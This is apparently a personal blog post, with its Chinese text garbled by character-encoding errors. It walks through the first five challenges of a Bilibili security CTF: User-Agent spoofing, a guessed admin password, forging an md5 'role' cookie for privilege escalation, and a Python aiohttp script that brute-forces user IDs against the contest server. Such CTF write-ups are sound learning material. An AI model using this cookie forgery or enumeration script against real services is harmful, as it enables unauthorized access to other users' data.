<!DOCTYPE html> <html lang=zh-Hans dir=ltr> <head> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-179909808-1"></script> <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-179909808-1")</script> <meta charset=utf-8> <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"> <title>Bç«™å®‰å…¨æŒ‘æˆ˜èµ›è§£ç­”è¿‡ç¨‹è®°å½• | shniubobo's Blog</title> <meta name=description content="Bç«™è¿™æ¬¡çš„å®‰å…¨æŒ‘æˆ˜èµ›çœ‹ä¸Šå»æŒºæœ‰æ„æ€ï¼Œå‰å‡ é¢˜ä¹ŸæŒºç®€å•çš„ï¼Œå°±è¯•ç€å‚åŠ äº†ä¸€ä¸‹ã€‚ç›®å‰åªåšå‡ºæ¥å‰äº”é¢˜ï¼›ä»ç¬¬å…­é¢˜å¼€å§‹ç½‘é¡µå°±è¿›ä¸å»äº†ï¼ŒåŒæ—¶ IP ä¹Ÿ ping ä¸é€šï¼Œåªèƒ½å…ˆç­‰é¡µé¢æ¢å¤æ­£å¸¸äº†ã€‚å…ˆé€šè¿‡è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹å‰äº”é¢˜çš„è§£ç­”è¿‡ç¨‹ã€‚"> <meta name=keywords content=bilibili,Bç«™,1024,ç¨‹åºå‘˜èŠ‚,å®‰å…¨æŒ‘æˆ˜èµ›,è§£ç­”,ç­”æ¡ˆ> <link rel=stylesheet href=https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/css/bootstrap.min.css integrity="sha256-Ww++W3rXBfapN8SZitAvc9jw2Xb+Ixt0rvDsmWmQyTo=" crossorigin=anonymous> <link rel=stylesheet href=https://shniubobo.xyz/static/style.css> </head> <body class="d-flex flex-column"> <nav class="navbar navbar-expand navbar-light shadow-sm fixed-top px-lg-0"> <div class="container-lg container-fluid col-xxl-6 d-sm-flex d-block"> <div class="text-center text-sm-left"> <a class="navbar-brand ml-sm-0 mr-sm-3 mx-auto my-0 h1" href=https://shniubobo.xyz/ >shniubobo's Blog</a> </div> <div class="d-flex flex-grow-1 justify-content-center"> <div class="flex-sm-grow-1 navbar-nav"> <a class="nav-item nav-link" href=https://shniubobo.xyz/ >ä¸»é¡µ</a> </div> <div class="my-auto mr-n2 navbar-nav"> <a class="nav-item nav-link" id=feed href=https://shniubobo.xyz/feeds/all.atom.xml><svg class=icon><use xlink:href=#icon-feed></use></svg></a> </div> </div> </div> </nav> <div class="container-lg container-fluid col-xxl-6" id=content> <div class="row row-cols-4"> <div class="col-md-9 col-12 pl-lg-0"> <article class="border-0 card" id=article-card> <h2 id=title>Bç«™å®‰å…¨æŒ‘æˆ˜èµ›è§£ç­”è¿‡ç¨‹è®°å½•</h2> <div class="text-muted flex-grow-1" id=metadata><time datetime=2020-10-25>2020-10-25</time><span class=dot></span>Notes</div> <hr class=my-0> <div class="text-justify alert alert-light mb-0">Bç«™è¿™æ¬¡çš„å®‰å…¨æŒ‘æˆ˜èµ›çœ‹ä¸Šå»æŒºæœ‰æ„æ€ï¼Œå‰å‡ é¢˜ä¹ŸæŒºç®€å•çš„ï¼Œå°±è¯•ç€å‚åŠ äº†ä¸€ä¸‹ã€‚ç›®å‰åªåšå‡ºæ¥å‰äº”é¢˜ï¼›ä»ç¬¬å…­é¢˜å¼€å§‹ç½‘é¡µå°±è¿›ä¸å»äº†ï¼ŒåŒæ—¶ <span class=caps>IP</span> ä¹Ÿ pingÂ ä¸é€šï¼Œåªèƒ½å…ˆç­‰é¡µé¢æ¢å¤æ­£å¸¸äº†ã€‚å…ˆé€šè¿‡è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹å‰äº”é¢˜çš„è§£ç­”è¿‡ç¨‹ã€‚</div> <hr class=mt-0> <div> <div class="callout callout-info compound"> <p>ç”±äºæ¯ä¸ªäººè·å¾—çš„ <code>flag</code> ä¼¼ä¹æ˜¯ä¸åŒçš„ï¼Œå› æ­¤æ–‡ä¸­çš„æ‰€æœ‰ <code>flag</code> éƒ½æ›¿æ¢æˆäº† <code>[REDACTED]</code>ã€‚åŒæ—¶æ–‡ä¸­æ¶‰åŠçš„ Cookie ä¹Ÿéƒ½ä¼šæ›¿æ¢ä¸º <code>[REDACTED]</code>ã€‚</p> </div> <section id=id1> <h3>ç¬¬ä¸€é¢˜ï¼šé¡µé¢çš„èƒŒåæ˜¯ä»€ä¹ˆï¼Ÿ</h3> <p>è¿™é“é¢˜å¾ˆç®€å•ï¼Œå®¡æŸ¥å…ƒç´ é‡Œå¯ä»¥ç›´æ¥æ‰¾åˆ°ï¼š</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>"flag1"</span> <span class=na>type</span><span class=o>=</span><span class=s>"hidden"</span> <span class=na>values</span><span class=o>=</span><span class=s>"flag1"</span> <span class=na>value</span><span class=o>=</span><span class=s>"[REDACTED]"</span><span class=p>></span>
</pre></div> </section> <section id=id2> <h3>ç¬¬äºŒé¢˜ï¼šçœŸæ­£çš„ç§˜å¯†åªæœ‰ç‰¹æ®Šçš„è®¾å¤‡æ‰èƒ½çœ‹åˆ°</h3> <p>ç¬¬äºŒé¢˜åŒæ ·å¾ˆç®€å•ã€‚æ ¹æ®é¡µé¢æç¤ºï¼š</p> <blockquote> éœ€è¦ä½¿ç”¨bilibili Security Browseræµè§ˆå™¨è®¿é—®ï½</blockquote> <p>å¾ˆå®¹æ˜“æƒ³åˆ°éœ€è¦ä¿®æ”¹ <code>User-Agent</code>ã€‚æœ‰ä¸¤ç§åŠæ³•ã€‚</p> <p>ç¬¬ä¸€ç§æ–¹æ³•ã€‚å¯ä»¥ç›´æ¥åœ¨ Chrome çš„ DevTools ä¸­ï¼Œæ‰¾åˆ° Network conditions é€‰é¡¹å¡ï¼Œç„¶åå–æ¶ˆå‹¾é€‰ User agent ä¸€æ çš„ <code>Select automatically</code>ï¼Œå¹¶åœ¨ä¸‹é¢é€‰æ‹© <code>Custom...</code>ï¼Œå¡«å…¥ <code>bilibili Security Browser</code>ã€‚åˆ·æ–°ä¸€ä¸‹å³å¯çœ‹åˆ°ç­”æ¡ˆã€‚</p> <p>ç¬¬äºŒç§æ–¹æ³•ã€‚å¯ä»¥é€šè¿‡å„ç§ <span class=caps>HTTP</span> å®¢æˆ·ç«¯ï¼Œå¦‚ <code>curl</code>ã€<code>wget</code>ã€Postman ç­‰å‘ <span class=caps>API</span> å‘é€è¯·æ±‚ã€‚æˆ‘è¿™é‡Œé€‰æ‹©ä½¿ç”¨ <code>httpie</code>ï¼Œä¸»è¦æ˜¯ç”¨èµ·æ¥æ¯”è¾ƒæ–¹ä¾¿ã€‚é¦–å…ˆé€šè¿‡å®¡æŸ¥å…ƒç´ æ‰¾åˆ°æ¥å£ï¼š</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>script</span><span class=p>></span>
    <span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>({</span>
<span class=hll>        <span class=nx>url</span><span class=o>:</span> <span class=s2>"api/ctf/2"</span><span class=p>,</span>
</span>        <span class=nx>type</span><span class=o>:</span> <span class=s2>"get"</span><span class=p>,</span>
        <span class=nx>success</span><span class=o>:</span><span class=kd>function</span> <span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
            <span class=c1>//console.log(data);</span>
            <span class=k>if</span> <span class=p>(</span><span class=nx>data</span><span class=p>.</span><span class=nx>code</span> <span class=o>==</span> <span class=mf>200</span><span class=p>){</span>
                <span class=c1>// å¦‚æœæœ‰å€¼ï¼šå‰ç«¯è·³è½¬</span>
                <span class=nx>$</span><span class=p>(</span><span class=s1>'#flag2'</span><span class=p>).</span><span class=nx>html</span><span class=p>(</span><span class=s2>"flag2: "</span> <span class=o>+</span> <span class=nx>data</span><span class=p>.</span><span class=nx>data</span><span class=p>);</span>
            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
                <span class=c1>// å¦‚æœæ²¡å€¼</span>
                <span class=nx>$</span><span class=p>(</span><span class=s1>'#flag2'</span><span class=p>).</span><span class=nx>html</span><span class=p>(</span><span class=s2>"éœ€è¦ä½¿ç”¨bilibili Security Browseræµè§ˆå™¨è®¿é—®ï½"</span><span class=p>);</span>
            <span class=p>}</span>
        <span class=p>}</span>
    <span class=p>})</span>
<span class=p>&lt;/</span><span class=nt>script</span><span class=p>></span>
</pre></div> <p>ä»é«˜äº®çš„è¿™ä¸€è¡Œï¼Œå¯ä»¥çœ‹å‡ºæ¥å£æ˜¯ <code>http://45.113.201.36/api/ctf/2</code>ã€‚æ­¤å¤–ä¹Ÿå¯ä»¥é€šè¿‡ DevTools çš„ NetworkÂ é€‰é¡¹å¡æ‰¾åˆ°æ¥å£ï¼Œä¸å†èµ˜è¿°ã€‚</p> <p>ç„¶åå°±æ˜¯å‘é€è¯·æ±‚ã€‚å‘é€è¯·æ±‚æ—¶è®°å¾—å¸¦ä¸Š <code>Cookie</code>ï¼Œå¦åˆ™ä¼šæç¤ºâ€œè¯·å…ˆç™»å½•â€ï¼š</p> <div class=highlight><pre><span></span><span class=gp>$</span> http http://45.113.201.36/api/ctf/2 <span class=se>\</span>
    <span class=s2>"User-Agent: bilibili Security Browser"</span> <span class=se>\</span>
    <span class=s2>"Cookie: [REDACTED]"</span>
<span class=go>HTTP/1.1 200 OK</span>
<span class=go>Connection: keep-alive</span>
<span class=go>Content-Length: 67</span>
<span class=go>Content-Type: application/json</span>
<span class=go>Date: [REDACTED]</span>
<span class=go>Server: nginx/1.10.3</span>
<span class=go>Vary: Cookie</span>

<span class=go>{</span>
<span class=go>    "code": 200,</span>
<span class=go>    "data": "[REDACTED]",</span>
<span class=go>    "msg": ""</span>
<span class=go>}</span>
</pre></div> </section> <section id=id3> <h3>ç¬¬ä¸‰é¢˜ï¼šå¯†ç æ˜¯å•¥ï¼Ÿ</h3> <p>è¯´å®è¯è¿™é“é¢˜æˆ‘ç›´åˆ°æœ€åéƒ½æ²¡æœ‰æƒ³å‡ºè§£æ³•ã€‚å‡ ä¸ªæˆ‘è®¤ä¸ºå¯èƒ½æœ‰ç”¨çš„åœ°æ–¹ <a class=m-footnote href=#id9 id=id4>1</a>ï¼š</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>"flag3"</span> <span class=na>content</span><span class=o>=</span><span class=s>"width=device-width, initial-scale=1.0"</span><span class=p>></span>
</pre></div> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>script</span><span class=p>></span>
    <span class=c1>//falg 3</span>

    <span class=nx>$</span><span class=p>(</span><span class=s2>"#submit"</span><span class=p>).</span><span class=nx>click</span><span class=p>(</span><span class=kd>function</span><span class=p>(){</span>

        <span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>({</span>
            <span class=nx>url</span><span class=o>:</span> <span class=s2>"api/ctf/3"</span><span class=p>,</span>
            <span class=nx>type</span><span class=o>:</span> <span class=s2>"post"</span><span class=p>,</span>
            <span class=nx>contentType</span><span class=o>:</span> <span class=s2>"application/json"</span><span class=p>,</span>
            <span class=nx>dataType</span><span class=o>:</span><span class=s2>"json"</span><span class=p>,</span>
            <span class=nx>data</span><span class=o>:</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>({</span>
<span class=hll>                <span class=nx>username</span><span class=o>:</span> <span class=nx>$</span><span class=p>(</span><span class=s2>"#name"</span><span class=p>).</span><span class=nx>val</span><span class=p>(),</span>
</span><span class=hll>                <span class=nx>passwd</span><span class=o>:</span> <span class=nx>$</span><span class=p>(</span><span class=s2>"#subject"</span><span class=p>).</span><span class=nx>val</span><span class=p>(),</span>
</span>            <span class=p>}),</span>
            <span class=nx>success</span><span class=o>:</span><span class=kd>function</span> <span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
                <span class=k>if</span> <span class=p>(</span><span class=nx>data</span><span class=p>.</span><span class=nx>code</span> <span class=o>==</span> <span class=mf>200</span><span class=p>){</span>
                    <span class=nx>alert</span><span class=p>(</span><span class=s2>"flag is: "</span> <span class=o>+</span> <span class=nx>data</span><span class=p>.</span><span class=nx>data</span><span class=p>);</span>
                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
                    <span class=nx>alert</span><span class=p>(</span><span class=s2>"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï½"</span><span class=p>);</span>
                <span class=p>}</span>
            <span class=p>}</span>
        <span class=p>})</span>
        <span class=p>});</span>
  <span class=p>&lt;/</span><span class=nt>script</span><span class=p>></span>
</pre></div> <p>ç„¶è€Œå„ç§å°è¯•æ— æœï¼Œå„ç§å¼±å¯†ç ä¹Ÿè¯•ä¸å‡ºæ¥ï¼Œæœ€ååœ¨ <a href="https://www.hostloc.com/forum.php?mod=redirect&goto=findpost&ptid=757940&pid=9345926" rel=noreferrer target=_blank>è¿™ä¸ªå¸–å­</a> é‡Œæ‰¾åˆ°äº†ç­”æ¡ˆï¼Œç”¨æˆ·åæ˜¯ <code>admin</code>ï¼Œå¯†ç æ˜¯ <code>bilibili</code>ï¼Œç„¶è€Œå¹¶æ²¡æœ‰è§£é‡Šæ˜¯å¦‚ä½•å¾—åˆ°è¿™ä¸ªç­”æ¡ˆçš„ã€‚</p> </section> <section id=id6> <h3>ç¬¬å››é¢˜ï¼šå¯¹ä¸èµ·ï¼Œæƒé™ä¸è¶³ï½</h3> <p>å’Œç¬¬äºŒé¢˜ä¸€æ ·æ‰¾åˆ°æ¥å£ï¼Œä»è¿™ä¸€é¢˜å¼€å§‹ä¼šå‘ç° Cookie ä¸­å¤šäº† <code>role</code> ä¸€é¡¹ï¼Œæ¨æµ‹å’Œä»–æœ‰å…³ã€‚è§‚å¯Ÿå‘ç° <code>role</code> ä¸€å…±æœ‰ 32 ä½ï¼Œä¸”éƒ½åœ¨ <code>[0-9a-f]</code> çš„èŒƒå›´å†…ï¼Œæ•…æ¨æµ‹æ˜¯ md5 è¿‡çš„ä¿¡æ¯ã€‚é¡µé¢ä¸Šæç¤ºâ€œè¶…çº§ç®¡ç†å‘˜â€ï¼Œæ‰€ä»¥å¯ä»¥è¯•è¯•å„ç§å’Œç®¡ç†å‘˜ç›¸å…³çš„è¯ï¼Œæ¯”å¦‚è¯´ <code>admin</code>ã€<code>administrator</code>ã€<code>root</code> ç­‰ã€‚æœ€åå‘ç°æ˜¯ <code>Administrator</code> ï¼ˆé¦–å­—æ¯å¤§å†™ï¼‰ï¼š</p> <div class=highlight><pre><span></span><span class=gp>$</span> python -c <span class=s2>"from hashlib import md5; print(md5(b'Administrator').hexdigest())"</span>
<span class=go>7b7bc2512ee1fedcd76bdc68926d4f7b</span>
<span class=gp>$</span> http http://45.113.201.36/api/ctf/4 <span class=se>\</span>
    <span class=s2>"Cookie: session=[REDACTED]; role=7b7bc2512ee1fedcd76bdc68926d4f7b"</span>
<span class=go>HTTP/1.1 200 OK</span>
<span class=go>Connection: keep-alive</span>
<span class=go>Content-Length: 67</span>
<span class=go>Content-Type: application/json</span>
<span class=go>Date: [REDACTED]</span>
<span class=go>Server: nginx/1.10.3</span>
<span class=go>Vary: Cookie</span>

<span class=go>{</span>
<span class=go>    "code": 200,</span>
<span class=go>    "data": "[REDACTED]",</span>
<span class=go>    "msg": ""</span>
<span class=go>}</span>
</pre></div> </section> <section id=id7> <h3>ç¬¬äº”é¢˜ï¼šåˆ«äººçš„ç§˜å¯†</h3> <p>é¦–å…ˆè¯•äº†å‡ æ¬¡è¿™é¢˜çš„ <span class=caps>API</span>ï¼Œä¸ç®¡å“ªä¸ª <code>uid</code> è¿”å›çš„ <code>code</code> ä¸€ç›´éƒ½æ˜¯ <code>403</code>ã€‚è§‚å¯Ÿäº†ä¸€ä¸‹é¡µé¢æ²¡å‘ç°ä»€ä¹ˆä¿¡æ¯ï¼Œæ•…æ‰“ç®—ç›´æ¥æš´åŠ›ç ´è§£ã€‚</p> <p>ä¸€å¼€å§‹å†™çš„è„šæœ¬ç”¨çš„æ˜¯ <code>requests</code> ï¼ˆPython æœ€å¸¸ç”¨çš„ <span class=caps>HTTP</span> åº“ï¼‰ï¼Œä½†æ˜¯é€Ÿåº¦æ„Ÿäººï¼Œåˆæ¢æˆäº† <code>aiohttp</code>ã€‚è·‘äº†å¾ˆä¹…ï¼ŒæœåŠ¡å™¨è¿˜ç»å¸¸ä¸ç¨³å®š 404ï¼Œå§‹ç»ˆæ²¡æ‰¾å‡ºæ­£ç¡®çš„ <code>uid</code>ã€‚</p> <p>åæ¥çªç„¶æƒ³èµ·åœ¨ç½‘é¡µé‡Œæœ‰çœ‹åˆ°ä¸€ä¸ª <code>uid</code>ï¼Œæ˜¯ <code>100336889</code>ï¼ŒçŒœæµ‹ç­”æ¡ˆå’Œè¿™ä¸ªæœ‰å…³ã€‚è¯•äº†ä¸€ä¸‹è¿™ä¸ª <code>uid</code>ï¼Œä¾æ—§ <code>403</code>ï¼ŒåˆæŠŠè¿™ä¸ªä½œä¸ºèµ·å§‹ <code>uid</code> æ”¾è¿›æš´åŠ›ç ´è§£çš„è„šæœ¬é‡Œï¼Œæ²¡æƒ³åˆ°ä¸€ç¬é—´å°±è¯•å‡ºæ¥äº†ğŸ¤¦â€â™‚ï¸ã€‚</p> <p>è™½ç„¶æœ‰äº›æ€é¸¡ç”¨ç‰›åˆ€çš„æ„Ÿè§‰ï¼Œè¿˜æ˜¯æŠŠè„šæœ¬ä»£ç æ”¾å‡ºæ¥å§ğŸ˜…ï¼š</p> <table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65</pre></div><td class=code><div class=highlight><pre><span></span><span class=sd>"""\</span>
<span class=sd>Copyright (c) 2020 shniubobo</span>

<span class=sd>Permission is hereby granted, free of charge, to any person obtaining a</span>
<span class=sd>copy of this software and associated documentation files (the "Software"),</span>
<span class=sd>to deal in the Software without restriction, including without limitation</span>
<span class=sd>the rights to use, copy, modify, merge, publish, distribute, sublicense,</span>
<span class=sd>and/or sell copies of the Software, and to permit persons to whom the</span>
<span class=sd>Software is furnished to do so, subject to the following conditions:</span>

<span class=sd>The above copyright notice and this permission notice shall be included in</span>
<span class=sd>all copies or substantial portions of the Software.</span>

<span class=sd>THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span>
<span class=sd>IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span>
<span class=sd>FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span>
<span class=sd>AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span>
<span class=sd>LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING</span>
<span class=sd>FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER</span>
<span class=sd>DEALINGS IN THE SOFTWARE.</span>
<span class=sd>"""</span>
<span class=kn>import</span> <span class=nn>asyncio</span>

<span class=kn>import</span> <span class=nn>aiohttp</span>
<span class=kn>from</span> <span class=nn>retrying</span> <span class=kn>import</span> <span class=n>retry</span>

<span class=n>FROM</span> <span class=o>=</span> <span class=mi>100336889</span>
<span class=n>URL</span> <span class=o>=</span> <span class=s1>'http://45.113.201.36/api/ctf/5'</span>
<span class=n>success</span> <span class=o>=</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>Event</span><span class=p>()</span>


<span class=nd>@retry</span><span class=p>(</span><span class=n>stop_max_attempt_number</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
<span class=k>async</span> <span class=k>def</span> <span class=nf>make_request</span><span class=p>(</span><span class=n>uid</span><span class=p>,</span> <span class=n>session</span><span class=p>):</span>
    <span class=k>async</span> <span class=k>with</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s1>'uid'</span><span class=p>:</span> <span class=n>uid</span><span class=p>},</span>
                           <span class=n>raise_for_status</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span> <span class=k>as</span> <span class=n>resp</span><span class=p>:</span>
        <span class=n>resp_json</span> <span class=o>=</span> <span class=k>await</span> <span class=n>resp</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
        <span class=k>if</span> <span class=nb>int</span><span class=p>(</span><span class=n>resp_json</span><span class=p>[</span><span class=s1>'code'</span><span class=p>])</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>'SUCCESS - </span><span class=si>{</span><span class=n>uid</span><span class=si>}</span><span class=s1>:</span><span class=se>\n</span><span class=s1>'</span>
                  <span class=sa>f</span><span class=s1>'    data = </span><span class=si>{</span><span class=n>resp_json</span><span class=p>[</span><span class=s2>"data"</span><span class=p>]</span><span class=si>}</span><span class=se>\n</span><span class=s1>'</span>
                  <span class=sa>f</span><span class=s1>'    msg = </span><span class=si>{</span><span class=n>resp_json</span><span class=p>[</span><span class=s2>"msg"</span><span class=p>]</span><span class=si>}</span><span class=se>\n</span><span class=s1>'</span><span class=p>)</span>
            <span class=n>success</span><span class=o>.</span><span class=n>set</span><span class=p>()</span>


<span class=k>async</span> <span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
    <span class=n>cookies</span> <span class=o>=</span> <span class=p>{</span>
        <span class=s1>'role'</span><span class=p>:</span> <span class=s1>'[REDACTED]'</span><span class=p>,</span>
        <span class=s1>'session'</span><span class=p>:</span> <span class=s1>'[REDACTED]'</span><span class=p>,</span>
    <span class=p>}</span>
    <span class=k>async</span> <span class=k>with</span> <span class=n>aiohttp</span><span class=o>.</span><span class=n>ClientSession</span><span class=p>(</span><span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span> <span class=k>as</span> <span class=n>s</span><span class=p>:</span>
        <span class=n>uid</span> <span class=o>=</span> <span class=n>FROM</span>
        <span class=n>tasks</span> <span class=o>=</span> <span class=p>[]</span>
        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
            <span class=nb>print</span><span class=p>(</span><span class=n>uid</span><span class=p>)</span>
            <span class=n>tasks</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>asyncio</span><span class=o>.</span><span class=n>create_task</span><span class=p>(</span><span class=n>make_request</span><span class=p>(</span><span class=n>uid</span><span class=p>,</span> <span class=n>s</span><span class=p>)))</span>
            <span class=k>if</span> <span class=n>uid</span> <span class=o>%</span> <span class=mi>100</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
                <span class=k>await</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>gather</span><span class=p>(</span><span class=o>*</span><span class=n>tasks</span><span class=p>)</span>
                <span class=n>tasks</span><span class=o>.</span><span class=n>clear</span><span class=p>()</span>
            <span class=k>if</span> <span class=n>success</span><span class=o>.</span><span class=n>is_set</span><span class=p>():</span>
                <span class=k>break</span>
            <span class=n>uid</span> <span class=o>+=</span> <span class=mi>1</span>
        <span class=k>await</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>gather</span><span class=p>(</span><span class=o>*</span><span class=n>tasks</span><span class=p>)</span>


<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>'__main__'</span><span class=p>:</span>
    <span class=n>asyncio</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
</pre></div> </table><p>ç¨å¾®è§£é‡Šä¸€ä¸‹ã€‚ç¬¬ 32 è¡Œçš„ <code>@retry</code> æ˜¯ä¸ºäº†é˜²æ­¢æœåŠ¡å™¨ä¸ç¨³å®šå¯¼è‡´è„šæœ¬ç›´æ¥é€€å‡ºã€‚<code>make_request</code> ä¼šåœ¨æˆåŠŸæ—¶è°ƒç”¨ <code>success.set</code>ï¼Œå‘ŠçŸ¥ <code>main</code> ä¸ç”¨å†è¿è¡Œä¸‹å»äº†ã€‚</p> </section> <section id=id8> <h3>å‰©ä¸‹çš„é¢˜ç›®</h3> <p>ç¬¬å…­é¢˜çš„é¡µé¢å§‹ç»ˆè¿›ä¸å»ï¼Œä¹Ÿ pingÂ ä¸é€šã€‚æ•…éšœçš„è¯ä¸è‡³äºæŒç»­è¿™ä¹ˆä¹…ï¼Œçœ‹æ¥è¿™æˆ–è®¸æ˜¯æ­£å¸¸ç°è±¡ğŸ¤”ï¼Ÿä¹‹åå¦‚æœæˆ‘æ¢ç©¶å‡ºä¸ªæ‰€ä»¥ç„¶çš„è¯ä¹Ÿä¼šè¡¥ä¸Šè§£ç­”è¿‡ç¨‹ã€‚</p> <hr> <dl class=m-footnote> <dt id=id9>1.</dt> <dd><span class=m-footnote><a href=#id4>^</a></span> å…¶ä¸­ç¬¬ä¸€å¤„çš„ <code>&lt;meta></code> æ ‡ç­¾æˆ‘åæ¥å‘ç°æ¯ä¸€é¢˜çš„é¡µé¢ä¸­éƒ½å­˜åœ¨ğŸ¤£ã€‚</dd> </dl> </section> </div> <div class="alert alert-secondary" id=license> <div class=mb-3 id=license-meta> <h2 id=license-title>Bç«™å®‰å…¨æŒ‘æˆ˜èµ›è§£ç­”è¿‡ç¨‹è®°å½•</h2> <div id=meta-url><a href=https://shniubobo.xyz/article/bilibili-1024.html class=text-muted>https://shniubobo.xyz/article/bilibili-1024.html</a></div> <div class="d-flex flex-wrap mt-3"> <div class="meta-kv flex-grow-1 flex-sm-grow-0"> <div class=meta-key>ä½œè€…</div> <div class=meta-value>shniubobo</div> </div> <div class=meta-kv> <div class="meta-key text-right text-sm-left">å‘å¸ƒæ—¥æœŸ</div> <div class=meta-value>2020-10-25</div> </div> <div class="flex-linebreak d-sm-none mb-1"></div> <div class=meta-kv> <div class=meta-key>è®¸å¯åè®®</div> <div class=meta-value><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank rel=noreferrer>CC BY-NC-SA 4.0</a></div> </div> </div> </div> <div id=license-notice>è½¬è½½æˆ–å¼•ç”¨æœ¬æ–‡æ—¶è¯·éµå®ˆè®¸å¯åè®®ï¼Œæ³¨æ˜å‡ºå¤„ï¼Œä»¥ç›¸åŒæ–¹å¼å‘å¸ƒï¼Œä¸”ä¸å¾—å•†ç”¨ï¼</div> </div> <div class="d-flex mb-n1 mb-sm-n3 user-select-none" id=neighbours> <a href=https://shniubobo.xyz/article/hello-world.html class="neighbour-item d-flex align-items-center"> <svg class="icon icon-neighbour icon-prev mr-3"><use xlink:href=#icon-next></use></svg> <div> <div class=neighbour>ä¸Šä¸€ç¯‡</div> <div>Hello,Â world!</div> </div> </a> <div class=flex-grow-1></div> <div class="text-muted text-right neighbour-item d-flex align-items-center"> <div> <div class=neighbour>ä¸‹ä¸€ç¯‡</div> <div>æ— </div> </div> <svg class="icon icon-neighbour icon-next ml-3"><use xlink:href=#icon-next></use></svg> </div> </div> </article> </div> <div class="col-md col-12 pl-md-0 pr-lg-0"> <div class="border-0 card text-center" id=profile-card> <img src=https://shniubobo.xyz/static/avatar.jpg alt=Avatar class="rounded-circle img-thumbnail mx-auto mb-2" id=avatar> <div id=name class=mb-1>shniubobo</div> <p class="mb-2 d-block d-md-none d-lg-block">ä»æœªåœæ­¢æ€è€ƒ</p> <div class="container col-xl-8 col-md-12 col-sm-4 col-6"> <div class="row row-cols-2 mb-0 pl-0"> <div class="col px-0"><a class="d-inline-block social-icon" href=https://github.com/shniubobo target=_blank rel=noreferrer><svg class=icon><use xlink:href=#icon-github></use></svg></a></div> <div class="col px-0"><a class="d-inline-block social-icon" href=https://steamcommunity.com/id/shniubobo/ target=_blank rel=noreferrer><svg class=icon><use xlink:href=#icon-steam></use></svg></a></div> </div> </div> </div> </div> </div> </div> <footer lang=en class=mt-auto> <div class="container-lg container-fluid col-xxl-6 my-3 px-lg-0 d-md-flex text-muted text-md-left text-center"> <div class=flex-grow-1>Copyright Â© 2020 shniubobo</div> <div> <span class="d-block d-sm-inline">Powered by <a class=link-text href=https://github.com/getpelican/pelican target=_blank rel=noreferrer>Pelican</a></span><span class="dot d-none d-sm-inline"></span><span>Made by <a class=link-text href=https://shniubobo.xyz/about.html>shniubobo</a> with <span class=coffee></span></span> </div> </div> </footer> <script src=//at.alicdn.com/t/font_2112932_q7g9e3n630l.js crossorigin=anonymous></script> <script src=https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin=anonymous></script> <script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script> <script src=https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.min.js integrity="sha256-ecWZ3XYM7AwWIaGvSdmipJ2l1F4bN9RXW6zgpeAiZYI=" crossorigin=anonymous></script> 